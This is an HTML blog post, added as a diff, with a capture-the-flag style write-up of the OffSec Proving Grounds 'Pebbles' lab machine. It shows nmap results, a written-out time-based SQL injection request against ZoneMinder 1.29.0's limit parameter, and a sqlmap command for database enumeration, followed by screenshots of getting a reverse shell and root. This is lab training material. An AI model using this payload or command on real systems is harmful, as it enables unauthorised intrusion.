@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Practice: Pebbles</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Practice: Pebbles | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Practice: Pebbles" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/08/18/Proving_grounds_Practice-Pebbles.html" />
+<meta property="og:url" content="http://localhost:4000/2023/08/18/Proving_grounds_Practice-Pebbles.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-18T06:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Practice: Pebbles" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-08-18T06:00:00+05:30","datePublished":"2023-08-18T06:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Practice: Pebbles","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/08/18/Proving_grounds_Practice-Pebbles.html"},"url":"http://localhost:4000/2023/08/18/Proving_grounds_Practice-Pebbles.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/08/18/Proving_grounds_Practice-Pebbles.html">
+    <h2 class="post-title">Proving grounds Practice: Pebbles</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Aug 18, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 aacf5a9347180e7f3d6da5aff86aa51e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c7636c8ab5a76f05bfd0e390b5b89658 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 93b26a1163861b5ef5895852897ff342 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Pebbles
+3305/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+8080/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Tomcat
+|_http-favicon: Apache Tomcat
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="directory-fuzzing">Directory Fuzzing</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/dir.png" alt="img" /></p>
+
+<p><strong>ZoneMinder v1.29.0</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/zm.png" alt="img" /></p>
+
+<p>Zoneminder v1.29.0 is vulnerable to SQL Injection vulnerability.</p>
+
+<p><strong>Searchsploit</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/searchsploit.png" alt="img" /></p>
+
+<h2 id="construct-and-exploit-sql-injection-vulnerability">Construct and Exploit SQL Injection vulnerability</h2>
+
+<h3 id="request">Request</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/zm/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.210.52</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">112</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">X-Requested-With</span><span class="p">:</span> <span class="s">XMLHttpRequest</span>
+<span class="na">X-Request</span><span class="p">:</span> <span class="s">JSON</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span>
+<span class="na">Content-type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://192.168.210.52</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://192.168.210.52/zm/</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">zmSkin=classic; zmCSS=classic; ZMSESSID=e6s5540cs098ev3kra5sksjme6</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+view=request&amp;request=log&amp;task=query&amp;limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&amp;minTime=1466674406.084434
+</code></pre></div></div>
+
+<h3 id="response">Response</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/response.png" alt="img" /></p>
+
+<p>The vulnerability says the <code class="language-plaintext highlighter-rouge">limit</code> parameter is vulnerable and automate the exploit using sqlmap.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://192.168.210.52/zm/index.php <span class="nt">--data</span><span class="o">=</span><span class="s2">"view=request&amp;request=log&amp;task=query&amp;limit=100&amp;minTime=1"</span> <span class="nt">-p</span> limit <span class="nt">--batch</span> <span class="nt">--dbs</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 4
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/db.png" alt="img" /></p>
+
+<p><strong>Obtain reverse shell via sqlmap</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/os-shell.png" alt="img" /></p>
+
+<p><strong>Transfer nc and obtain reverse shell</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/os-shell2.png" alt="img" /></p>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Use PORT <code class="language-plaintext highlighter-rouge">3305</code> to get reverse connection sucessfully. Other ports are not allowed in the system.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Pebbles/root.png" alt="img" /></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
